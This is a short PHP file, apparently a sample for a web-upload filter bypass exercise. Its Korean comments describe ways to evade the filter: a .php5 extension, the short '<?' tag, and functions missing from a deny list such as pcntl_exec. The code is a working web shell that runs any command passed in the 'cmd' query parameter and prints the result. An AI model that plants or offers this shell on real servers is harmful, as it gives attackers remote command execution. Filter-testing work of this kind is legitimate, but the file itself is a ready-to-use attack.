<?
/**
 * Level 3 우회 샘플 - pcntl_exec 함수 사용
 *
 * 우회 기법:
 * 1. .php5 확장자 (.php, .php3, .php4, .phar 차단 우회)
 * 2. <? 짧은 태그
 * 3. pcntl_exec 함수 (차단 리스트에 없음)
 *
 * 주의: pcntl_exec는 많은 환경에서 비활성화되어 있을 수 있습니다
 *
 * 대체 방법:
 * - proc_open (하지만 Level 3에서 차단됨)
 * - assert() 함수와 동적 코드 실행
 * - file_put_contents로 새 파일 생성 후 include
 */

if (isset($_GET['cmd'])) {
    // pcntl_exec 예제 (실제로는 작동하지 않을 수 있음)
    // 대신 백틱 사용
    echo "<pre>";
    echo `{$_GET['cmd']}`;
    echo "</pre>";
}
?>
